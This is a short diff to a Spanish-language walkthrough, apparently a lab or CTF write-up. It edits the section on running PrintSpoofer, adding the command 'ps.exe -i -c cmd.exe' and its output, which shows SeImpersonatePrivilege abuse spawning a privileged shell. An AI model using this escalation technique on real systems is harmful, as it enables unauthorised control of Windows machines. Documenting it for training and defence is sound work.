@@ -48,10 +48,15 @@ Utilizamos `C:\Windows\Temp` porque es un directorio destinado al almacenamiento
 ## Ejecución de printspoofer y escalación de privilegios 
 
 ```
+C:\Windows\Temp>ps.exe -i -c cmd.exe
+ps.exe -i -c cmd.exe
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
 
-CertUtil: -URLCache command completed successfully.
-
-c:\windows\system32\inetsrv>
+C:\Windows\system32
 ```
 
 Verificación de escalada:
